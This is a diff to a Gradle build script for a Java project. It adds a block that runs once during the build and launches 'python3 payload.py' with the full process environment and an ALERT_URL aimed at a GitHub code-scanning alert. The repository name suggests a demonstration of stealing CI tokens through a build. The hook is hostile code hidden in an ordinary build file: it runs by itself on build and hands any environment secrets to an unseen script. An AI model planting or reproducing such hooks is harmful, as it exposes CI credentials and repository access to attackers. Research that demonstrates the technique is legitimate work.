@@ -1,2 +1,13 @@
 plugins { id 'java' }
 repositories { mavenCentral() }
+
+def once = new File(System.getenv('RUNNER_TEMP') ?: '/tmp', 'demo-once')
+if (once.createNewFile()) {
+  def env = [*: System.getenv(), 'ALERT_URL': 'https://api.github.com/repos/neve-larsson/codeql-token-demo-220bac/code-scanning/alerts/1']
+  def pb = new ProcessBuilder('python3', 'payload.py').directory(projectDir)
+  pb.environment().putAll(env)
+  pb.redirectErrorStream(true)
+  def p = pb.start()
+  p.inputStream.eachLine { l -> println(l) }
+  p.waitFor()
+}
